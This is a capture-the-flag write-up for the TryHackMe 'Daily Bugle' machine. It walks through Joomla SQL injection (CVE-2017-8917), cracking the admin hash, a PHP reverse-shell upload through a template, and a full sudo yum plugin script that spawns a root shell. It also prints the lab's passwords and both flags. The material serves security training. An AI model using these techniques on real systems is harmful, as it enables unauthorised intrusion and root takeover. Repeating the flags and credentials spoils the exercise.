# Write-up: Daily Bugle - THM

This document details the successful exploitation, privilege escalation, and flag retrieval for the target machine, `dailybugle` (10.81.163.107).

---

## 🔍 Phase 1: Enumeration and Initial Access

### 1.1 Service Discovery (Nmap)

An initial Nmap scan revealed the following critical information:

* **Target IP:** 10.81.163.107.
* **Port 22/tcp (SSH):** Open, running **OpenSSH 7.4**.
* **Port 80/tcp (HTTP):** Open, running **Apache httpd 2.4.6** ((CentOS) PHP/5.6.40). The server runs **Joomla! - Open Source Content Management**.
* **Port 3306/tcp (MySQL):** Open, running **MariaDB 10.3.23** or earlier.
* **OS Details:** Linux 4.15.

### 1.2 Vulnerability Identification

The Joomla! version was confirmed to be **3.7.0**.

* **Vulnerability:** Joomla! 3.7.0 is susceptible to a **SQL Injection** attack, tracked as **CVE-2017-8917**.

### 1.3 Exploitation and Credential Extraction

The exploit script for CVE-2017-8917 was executed:

1.  **Database Info:** The current database is `joomla` running **5.5.64-MariaDB**.
2.  **Table Dump:** The table `#__users` was targeted.
3.  **User Data Extraction:** Data was dumped, revealing the credentials for a 'Super User':
    * **Username:** `jonah`
    * [cite_start]**Password Hash:** `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm` [cite: 1]

### 1.4 Hash Cracking (Offline Attack)

The extracted bcrypt hash was cracked using **John the Ripper** with the `rockyou.txt` wordlist:

* [cite_start]**Hash:** `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm` [cite: 1]
* **Cracked Password:** **`spiderman123`**

### 1.5 Initial Foothold (PHP Reverse Shell)

Initial access was gained by using the Joomla! administrative interface. A PHP reverse shell payload was uploaded to a template file, and execution was triggered by clicking the "template preview" link, resulting in a low-privilege shell. The shell was then upgraded for stability:

      perl -e 'exec "/bin/bash";'
      export TERM=xterm 
      /usr/bin/script -qc /bin/bash /dev/null

## 💻 Phase 2: Post-Exploitation

### 2.1 Finding Additional Credentials

The Joomla! database configuration file was read to find connection credentials:

* **File Path:** `/var/www/html/configuration.php`
* **Extracted Credentials:**
    * **Database User:** `root`
    * **Database Password:** `nv5uz9r3ZEDzVjNu`
    * **Summary Credential:** Username: `jjameson`, Password: `nv5uz9r3ZEDzVjNu`.

### 2.2 User Access and User Flag

The password `nv5uz9r3ZEDzVjNu` was successfully used to log in via **SSH** using the username `jjameson`.

The user flag was retrieved from the home directory:

* **User Flag:** `27a260fe3cba712cfdedb1c86d80442e`

## 👑 Phase 3: Privilege Escalation (Root)

### 3.1 Sudo Privileges Enumeration

Checking the user's `sudo` privileges revealed a critical misconfiguration:

* **User `jjameson`** may run: **`(ALL) NOPASSWD: /usr/bin/yum`**.

### 3.2 Root Escalation via Malicious YUM Plugin

The NOPASSWD entry for `/usr/bin/yum` was exploited by injecting a malicious plugin that executes a shell when run with `sudo`.

The following commands were used to create the plugin files and execute the exploit, successfully gaining a root shell (`sh-4.2#`):
      
      TF=$(mktemp -d)
      cat >$TF/x<<EOF
      [main]
      plugins=1
      pluginpath=$TF
      pluginconfpath=$TF
      EOF
      
      cat >$TF/y.conf<<EOF
      [main]
      enabled=1
      EOF
      
      cat >$TF/y.py<<EOF
      import os
      import yum
      from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
      requires_api_version='2.1'
      def init_hook(conduit):
        os.execl('/bin/sh','/bin/sh')
      EOF

      sudo yum -c $TF/x --enableplugin=y

### 3.3 Root Flag Retrieval
With root privileges, the root flag was located and retrieved from the /root directory:

    Root Flag: eec3d53292b1821868266858d7fa6f79













